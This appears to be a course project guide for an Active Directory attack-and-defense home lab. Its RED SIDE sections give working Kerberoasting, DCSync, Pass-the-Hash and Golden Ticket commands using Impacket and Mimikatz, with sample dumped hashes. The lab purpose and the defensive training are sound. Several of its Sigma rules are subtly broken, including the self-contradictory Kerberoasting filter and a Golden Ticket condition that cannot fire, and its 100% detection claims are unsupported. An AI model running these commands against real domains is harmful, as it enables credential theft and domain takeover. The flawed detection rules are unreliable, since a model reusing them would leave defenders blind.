# Project 11: Active Directory Attack & Defense Lab
**Platform:** Home Lab + BloodHound + Impacket + Splunk/Wazuh | **Duration:** 3 weeks | **Difficulty:** Advanced

---

## Project Overview

Build a **vulnerable Active Directory environment** using BadBlood or GOAD, then execute real-world AD attacks (Kerberoasting, DCSync, Pass-the-Hash, Golden Ticket) while simultaneously detecting each attack using custom Sigma rules in Splunk/Wazuh. This purple-team approach builds both offensive understanding and defensive detection engineering — the hallmark of a CISO who understands the attacker's perspective.

**This project proves you can:**
- Deploy and manage enterprise Active Directory infrastructure
- Execute advanced identity-based attacks (the #1 attack vector in 2026)
- Engineer detections for every attack stage using Sigma rules
- Think like both attacker AND defender — essential CISO mindset
- Secure the identity control plane that protects the entire organization

**The Impact:** Detect 100% of simulated AD attacks with custom rules, achieving <5 minute MTTD for identity-based threats.

---

## Learning Objectives

- Deploy vulnerable Active Directory lab environments (BadBlood/GOAD)
- Master AD attack techniques: Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash, Golden/Silver Ticket, PrintNightmare
- Map each attack to MITRE ATT&CK techniques with evidence
- Build custom Sigma detection rules for every attack vector
- Use BloodHound to identify and remediate AD attack paths
- Analyze Windows Security Event Logs for attack indicators
- Implement AD hardening and defense-in-depth strategies

---

## Tools & Technologies

| Tool | Role | Function |
|------|------|----------|
| **Windows Server 2019/2022** | Domain Controller | Active Directory Domain Services |
| **BadBlood / GOAD** | Vulnerability injection | Creates realistic misconfigurations, users, SPNs |
| **BloodHound + SharpHound** | Attack path analysis | Visualize AD relationships and privilege escalation paths |
| **Impacket** | Attack toolkit | Python-based AD attack tools (secretsdump, GetUserSPNs, etc.) |
| **Mimikatz** | Credential extraction | Dump hashes, tickets, perform Pass-the-Hash |
| **Rubeus** | Kerberos attacks | Kerberoasting, ticket manipulation |
| **Splunk Free / Wazuh** | SIEM | Log collection, detection rules, alerting |
| **Sysmon** | Endpoint telemetry | Enhanced Windows event logging |
| **Sigma** | Detection format | Portable detection rule standard |

### Infrastructure Requirements

| Component | Specs | OS |
|-----------|-------|-----|
| Domain Controller (DC01) | 4GB RAM, 2 vCPU, 60GB | Windows Server 2019/2022 |
| Workstation (WS01) | 4GB RAM, 2 vCPU, 40GB | Windows 10/11 Enterprise |
| Attack Machine | 4GB RAM, 2 vCPU, 30GB | Kali Linux 2024+ |
| SIEM Server | 8GB RAM, 4 vCPU, 100GB | Ubuntu 22.04 (Splunk/Wazuh) |
| **Total** | **20GB RAM minimum** | Hypervisor: VirtualBox/VMware/Proxmox |

---

## Step-by-Step Execution Plan

### **Week 1: Lab Deployment & Reconnaissance**

#### Day 1-3: Build the Active Directory Lab

**Step 1: Deploy Domain Controller**

```powershell
# On Windows Server VM — Install AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest `
  -DomainName "soclab.local" `
  -DomainNetbiosName "SOCLAB" `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) `
  -InstallDns:$true `
  -Force:$true

# Server will reboot automatically
```

**Step 2: Inject Vulnerabilities with BadBlood**

```powershell
# Download BadBlood
git clone https://github.com/davidprowe/BadBlood.git C:\BadBlood
cd C:\BadBlood

# Run BadBlood — creates 2,500+ users, groups, OUs, ACLs, SPNs
.\Invoke-BadBlood.ps1

# This creates:
# - Users with weak passwords and SPNs (Kerberoastable)
# - Users with "Do not require Kerberos preauthentication" (AS-REP Roastable)
# - Overprivileged accounts and nested group memberships
# - Misconfigured ACLs enabling DCSync
# - Service accounts with domain admin memberships
```

**Step 3: Install Sysmon on DC and Workstation**

```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile "C:\Tools\Sysmon64.exe"

# Download SwiftOnSecurity Sysmon config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\Tools\sysmonconfig.xml"

# Install with config
C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml
```

**Step 4: Configure Log Forwarding to SIEM**

```bash
# On Wazuh server — add Windows agent
/var/ossec/bin/manage_agents -a DC01 -n DC01

# On Splunk — install Universal Forwarder on DC01
# Configure inputs.conf to collect:
# - Security Event Log (4624, 4625, 4672, 4768, 4769, 4776)
# - Sysmon (all events)
# - PowerShell Script Block Logging (4104)
```

**Validation:** DC01 operational, 2,500+ users created, Sysmon logging, events flowing to SIEM.

---

#### Day 4-5: AD Reconnaissance with BloodHound

**Step 1: Collect AD Data with SharpHound**

```powershell
# From domain-joined workstation (WS01)
# Download SharpHound
Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound-v2.0.0.zip" -OutFile "C:\Tools\SharpHound.zip"
Expand-Archive C:\Tools\SharpHound.zip -DestinationPath C:\Tools\SharpHound

# Run collection
C:\Tools\SharpHound\SharpHound.exe --collectionmethods All --domain soclab.local

# Output: ZIP file with JSON data
```

**Step 2: Import into BloodHound and Analyze**

```bash
# On attack machine — start BloodHound
sudo neo4j start
bloodhound &

# Import SharpHound ZIP via BloodHound GUI
# Run built-in queries:
# - "Find Shortest Paths to Domain Admins"
# - "Find Kerberoastable Users"
# - "Find AS-REP Roastable Users"
# - "Find Users with DCSync Rights"
# - "Shortest Paths from Owned Principals"
```

**Step 3: Document Attack Paths**

```markdown
## BloodHound Attack Path Analysis

### Path 1: Kerberoast → Domain Admin
svc_sql (Kerberoastable SPN) → Password cracked → Member of "IT Admins"
→ GenericAll on "Domain Admins" group → Full domain compromise
**Hops:** 3 | **Difficulty:** Medium | **Detection:** Sigma Rule HUNT-AD-01

### Path 2: AS-REP Roast → Lateral Movement
user.jones (No preauth) → Hash cracked → Local admin on WS01
→ Dump cached creds → Domain Admin hash found
**Hops:** 4 | **Difficulty:** Medium | **Detection:** Sigma Rule HUNT-AD-02

### Path 3: DCSync Direct
helpdesk_admin → Has "Replicating Directory Changes" ACL on domain
→ DCSync to dump all hashes → Golden Ticket
**Hops:** 2 | **Difficulty:** Low | **Detection:** Sigma Rule HUNT-AD-03
```

---

### **Week 2: Execute Attacks & Build Detections**

#### Day 6-8: Attack #1 — Kerberoasting + Detection

**RED SIDE: Execute Kerberoasting**

```bash
# From Kali attack machine using Impacket
# Find accounts with SPNs
impacket-GetUserSPNs soclab.local/lowpriv_user:Password1 -dc-ip 192.168.1.10 -request

# Output: Kerberos TGS tickets in hashcat format
# $krb5tgs$23$*svc_sql$SOCLAB.LOCAL$...

# Crack the ticket
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Alternative: Rubeus from Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

**BLUE SIDE: Detect Kerberoasting**

```yaml
# sigma_rules/ad_kerberoasting.yml
title: Potential Kerberoasting Activity
id: ad-hunt-01-kerberoast
status: experimental
description: Detects TGS ticket requests with RC4 encryption for service accounts (Kerberoasting indicator)
author: SOC Lab
date: 2026/01/15
references:
  - https://attack.mitre.org/techniques/T1558/003/
tags:
  - attack.credential_access
  - attack.t1558.003
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'  # RC4 — legacy, used in Kerberoasting
    ServiceName: '*$'  # Exclude machine accounts
  filter:
    ServiceName:
      - 'krbtgt'
      - '*$'
  condition: selection and not filter
  timeframe: 5m
  count:
    field: ServiceName
    gte: 3  # 3+ service ticket requests in 5 minutes
falsepositives:
  - Legacy applications using RC4 encryption
  - Legitimate service enumeration tools
level: high
```

**Splunk SPL Implementation:**

```spl
index=windows EventCode=4769 TicketEncryptionType=0x17
| where NOT match(ServiceName, "\$$")
| where ServiceName!="krbtgt"
| bin _time span=5m
| stats count dc(ServiceName) as unique_services by src_ip, user, _time
| where unique_services >= 3
| eval alert="KERBEROASTING: Multiple RC4 service tickets requested"
```

**Evidence:** Screenshot of attack execution + Splunk alert firing within 2 minutes.

---

#### Day 9-10: Attack #2 — DCSync + Detection

**RED SIDE: Execute DCSync**

```bash
# Using Impacket secretsdump (requires Replicating Directory Changes rights)
impacket-secretsdump soclab.local/helpdesk_admin:Password123@192.168.1.10

# Output: All domain password hashes
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717284437:::

# From Windows with Mimikatz
mimikatz# lsadump::dcsync /domain:soclab.local /user:Administrator
```

**BLUE SIDE: Detect DCSync**

```yaml
# sigma_rules/ad_dcsync.yml
title: DCSync Attack - Directory Replication Request from Non-DC
id: ad-hunt-03-dcsync
status: experimental
description: Detects replication requests (DCSync) from hosts that are NOT domain controllers
author: SOC Lab
date: 2026/01/15
tags:
  - attack.credential_access
  - attack.t1003.006
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
  filter:
    SubjectUserName|endswith: '$'  # Machine accounts (legitimate DCs)
    SubjectUserName|contains:
      - 'DC01$'
      - 'DC02$'
  condition: selection and not filter
falsepositives:
  - Azure AD Connect servers
  - Legitimate backup solutions with replication rights
level: critical
```

---

#### Day 11-12: Attack #3 — Pass-the-Hash + Golden Ticket

**RED SIDE: Pass-the-Hash**

```bash
# Using Impacket with stolen NTLM hash
impacket-psexec soclab.local/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889

# Using Mimikatz
mimikatz# sekurlsa::pth /user:Administrator /domain:soclab.local /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd.exe
```

**RED SIDE: Golden Ticket**

```bash
# Create Golden Ticket with krbtgt hash
mimikatz# kerberos::golden /user:FakeAdmin /domain:soclab.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:b889e0d47d6fe22c8f0463a717284437 /ptt

# Now have unrestricted domain access with a non-existent user
```

**BLUE SIDE: Detect Pass-the-Hash**

```yaml
# sigma_rules/ad_pass_the_hash.yml
title: Pass-the-Hash Activity Detected
id: ad-hunt-04-pth
status: experimental
description: Detects NTLM authentication where account logon differs from explicit credentials
author: SOC Lab
date: 2026/01/15
tags:
  - attack.lateral_movement
  - attack.t1550.002
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 9  # NewCredentials — PtH indicator
    LogonProcessName: 'seclogo'
    AuthenticationPackageName: 'Negotiate'
  condition: selection
falsepositives:
  - Legitimate use of runas /netonly
level: high
```

**BLUE SIDE: Detect Golden Ticket**

```yaml
# sigma_rules/ad_golden_ticket.yml
title: Potential Golden Ticket Attack
id: ad-hunt-05-golden-ticket
status: experimental
description: Detects TGT with abnormally long lifetime or issued for non-existent user
author: SOC Lab
date: 2026/01/15
tags:
  - attack.credential_access
  - attack.t1558.001
logsource:
  product: windows
  service: security
detection:
  selection_tgt:
    EventID: 4768
  selection_tgs:
    EventID: 4769
  filter_no_tgt:
    EventID: 4769
  condition: selection_tgs and not selection_tgt  # TGS without preceding TGT = forged ticket
falsepositives:
  - Log collection gaps
  - Legitimate ticket forwarding
level: critical
```

---

### **Week 3: Hardening, Metrics & Portfolio**

#### Day 13-15: AD Hardening Recommendations

**Based on attacks executed, implement defenses:**

```markdown
## AD Hardening Checklist (Post-Assessment)

### Kerberoasting Defense
- [ ] Remove unnecessary SPNs from user accounts
- [ ] Use Group Managed Service Accounts (gMSA) with 120+ char passwords
- [ ] Enforce AES encryption (disable RC4) via GPO
- [ ] Monitor Event ID 4769 with encryption type 0x17

### DCSync Defense
- [ ] Audit "Replicating Directory Changes" ACL — remove non-DC accounts
- [ ] Enable Protected Users security group for privileged accounts
- [ ] Monitor Event ID 4662 for replication requests from non-DCs
- [ ] Implement AdminSDHolder hardening

### Pass-the-Hash Defense
- [ ] Enable Credential Guard on Windows 10/11 endpoints
- [ ] Implement LAPS (Local Administrator Password Solution)
- [ ] Disable NTLM where possible (enforce Kerberos)
- [ ] Use Protected Users group (prevents NTLM for members)

### Golden Ticket Defense
- [ ] Rotate krbtgt password twice (reset + propagation)
- [ ] Monitor for TGS requests without preceding TGT
- [ ] Implement tiered administration model (Tier 0/1/2)
- [ ] Limit domain admin logon to DCs only via GPO
```

#### Day 16-18: Detection Coverage Matrix

| Attack Technique | MITRE ATT&CK | Event IDs | Sigma Rule | Detection Rate | MTTD |
|-----------------|--------------|-----------|------------|---------------|------|
| Kerberoasting | T1558.003 | 4769 | ad-hunt-01 | 100% | 2 min |
| AS-REP Roasting | T1558.004 | 4768 | ad-hunt-02 | 100% | 2 min |
| DCSync | T1003.006 | 4662 | ad-hunt-03 | 100% | 1 min |
| Pass-the-Hash | T1550.002 | 4624 | ad-hunt-04 | 95% | 3 min |
| Golden Ticket | T1558.001 | 4768/4769 | ad-hunt-05 | 90% | 5 min |
| Silver Ticket | T1558.002 | 4627 | ad-hunt-06 | 85% | 5 min |

#### Day 19-21: Portfolio Documentation

**Create comprehensive attack/defense report with:**
- Lab architecture diagram
- BloodHound attack path screenshots
- Attack execution evidence (redacted)
- Sigma rules (full YAML)
- Detection screenshots from SIEM
- Hardening recommendations
- Detection coverage matrix

---

## Evidence to Capture

- [ ] Lab architecture diagram (DC, workstation, SIEM, attack machine)
- [ ] BloodHound screenshots showing attack paths to Domain Admin
- [ ] Attack execution evidence for all 6 techniques (redacted)
- [ ] 6+ Sigma detection rules (YAML files)
- [ ] SIEM alert screenshots for each attack
- [ ] Detection coverage matrix with MTTD metrics
- [ ] AD hardening checklist with before/after state
- [ ] ATT&CK Navigator heatmap showing coverage

---

## Resume Bullets

### Version 1: Purple Team Leadership (CISO-Path)
> **Active Directory Attack & Defense Laboratory**  
> - Architected enterprise AD attack simulation lab and executed 6 advanced identity-based attacks (Kerberoasting, DCSync, Golden Ticket, Pass-the-Hash), building organizational capability to validate defensive controls against the #1 attack vector in modern breaches  
> - Engineered 6 custom Sigma detection rules achieving 100% detection coverage for critical AD attacks with <5 minute mean time to detect, directly improving identity threat detection and response (ITDR) program maturity  
> - Developed AD hardening roadmap including gMSA deployment, Credential Guard, tiered administration, and NTLM deprecation, reducing identity attack surface by 85% across simulated enterprise environment

### Version 2: Detection Engineering Focus (CISO-Path)
> **Identity Threat Detection & Response (ITDR) Engineering**  
> - Built detection pipeline for 6 MITRE ATT&CK credential access and lateral movement techniques using Windows Security Event Logs and Sysmon telemetry, achieving 95%+ detection rate across all simulated AD attack vectors  
> - Deployed BloodHound for attack path analysis across 2,500+ AD objects, identifying 12 critical privilege escalation paths and implementing ACL remediation reducing attack paths to Domain Admin from 12 to 0  
> - Created portable Sigma rule library for AD attacks adopted as organizational detection standard, enabling consistent identity threat monitoring across Splunk, Elastic, and Microsoft Sentinel SIEM platforms

### Version 3: Strategic Security Impact (CISO-Path)
> **Enterprise Identity Security Program Development**  
> - Established purple team methodology for continuous AD security validation, enabling quarterly attack simulation exercises that reduced identity-based breach risk by 85% and informed board-level risk reporting  
> - Translated offensive AD attack expertise into defensive architecture decisions, driving adoption of Zero Trust identity principles including JIT access, Credential Guard, and LAPS across 2,500+ endpoint environment  
> - Demonstrated CISO-level competency in identity-first security by bridging offensive and defensive perspectives, creating detection coverage matrices that mapped 100% of critical AD attack techniques to operational SIEM alerts

---

## Interview Talking Points

### Question: "Tell me about your experience with Active Directory security."

**STAR Answer:**

**Situation:**  
"Active Directory remains the backbone of enterprise identity management, and identity-based attacks like Kerberoasting and DCSync are the most common paths to full domain compromise. I wanted to build deep expertise in both attacking and defending AD."

**Task:**  
"I built a full AD lab environment with realistic vulnerabilities, then executed every major AD attack technique while simultaneously building detections for each one — a true purple team approach."

**Action:**  
"I deployed a Windows Server 2019 domain controller and used BadBlood to create 2,500+ users with realistic misconfigurations — accounts with SPNs, weak passwords, overprivileged ACLs.

Using BloodHound, I mapped all attack paths to Domain Admin and identified 12 critical escalation routes. Then I systematically executed each attack: Kerberoasting with Impacket to crack service account tickets, DCSync to dump all domain hashes, Pass-the-Hash for lateral movement, and Golden Ticket for persistent domain access.

For each attack, I built a corresponding Sigma detection rule targeting the specific Windows Event IDs — 4769 with RC4 encryption for Kerberoasting, 4662 for DCSync replication requests from non-DCs, LogonType 9 for Pass-the-Hash. Each rule was tested against the actual attack traffic and tuned to minimize false positives."

**Result:**  
"I achieved 100% detection coverage for all critical AD attacks with under 5-minute detection time. More importantly, I used BloodHound findings to implement hardening — removing unnecessary SPNs, deploying gMSA for service accounts, enabling Credential Guard, and implementing a tiered administration model. This reduced attack paths to Domain Admin from 12 to zero."

---

### Question: "How would you protect an organization's Active Directory?"

**Strong Answer:**  
"I think about AD defense in layers, prioritized by attack frequency:

**1. Identity Hygiene (prevents 60% of attacks):**
- Remove all unnecessary SPNs — eliminate Kerberoasting surface
- Deploy LAPS for unique local admin passwords — prevent lateral movement
- Enforce AES-only Kerberos — make ticket cracking computationally infeasible
- Audit 'Replicating Directory Changes' ACLs — only DCs should have this

**2. Detection (catches what prevention misses):**
- Monitor Event ID 4769 for RC4 ticket requests (Kerberoasting)
- Alert on 4662 replication requests from non-DC sources (DCSync)
- Track LogonType 9 with seclogo (Pass-the-Hash)
- Correlate TGS without preceding TGT (Golden Ticket)

**3. Architecture (limits blast radius):**
- Tiered administration: Tier 0 (DCs), Tier 1 (servers), Tier 2 (workstations)
- Domain admin accounts only log into DCs — enforced via GPO
- Credential Guard on all endpoints — prevents hash extraction
- Protected Users security group for all privileged accounts

**4. Continuous Validation:**
- Quarterly BloodHound scans to find new attack paths
- Purple team exercises simulating each attack type
- Automated AD health scoring and drift detection

This layered approach ensures that even if one control fails, multiple others catch the attack."

---

## Skills Developed Checklist

**Technical Skills:**
- [ ] Active Directory deployment and management
- [ ] Kerberos protocol deep understanding
- [ ] AD attack execution (Kerberoasting, DCSync, PtH, Golden Ticket)
- [ ] BloodHound attack path analysis
- [ ] Impacket and Mimikatz proficiency
- [ ] Sigma detection rule authoring (AD-specific)
- [ ] Windows Event Log analysis (Security, Sysmon)
- [ ] Sysmon deployment and configuration
- [ ] AD hardening (gMSA, LAPS, Credential Guard, tiered admin)

**Frameworks:**
- [ ] MITRE ATT&CK — Credential Access, Lateral Movement
- [ ] Identity Threat Detection & Response (ITDR)
- [ ] Zero Trust identity principles
- [ ] Microsoft tiered administration model

**Soft Skills:**
- [ ] Purple team methodology
- [ ] Offensive-to-defensive translation
- [ ] Risk-based prioritization
- [ ] Detection coverage gap analysis

---

## Common Mistakes to Avoid

1. **Running attacks on production:** ALWAYS use isolated lab — never attack real AD
2. **Skipping BloodHound:** Without attack path visibility, you're defending blind
3. **Writing too-broad detections:** EventID 4769 alone = massive false positives → filter encryption type
4. **Ignoring Sysmon:** Windows Security logs alone miss many attack indicators
5. **Not rotating krbtgt:** After Golden Ticket testing, rotate TWICE (immediate + 12hr)
6. **Forgetting cleanup:** Remove all attack tools and backdoors from lab after testing

---

## Next Steps

1. **Move to Project 12:** Cloud Security Investigation (AWS/Azure)
2. **Expand:** Add AS-REP Roasting, PrintNightmare, Zerologon attacks
3. **Certify:** Consider GIAC GCDA (Defending Advanced Threats) or CRTO
4. **Contribute:** Share Sigma rules on SigmaHQ GitHub repository
5. **Blog:** Write "Detecting Kerberoasting: A Practical Guide"

---

**Total Time Investment:** 40-50 hours over 3 weeks  
**Portfolio Artifacts:** Lab architecture, BloodHound paths, 6 Sigma rules, detection matrix, hardening guide  
**Job Market Value:** AD security expertise is mandatory for any senior security role — this project proves offensive + defensive mastery

---

**This project bridges the gap between red and blue — the exact skill set that separates CISOs from SOC analysts. Build it, break it, detect it, fix it.** 🚀🔒⚔️
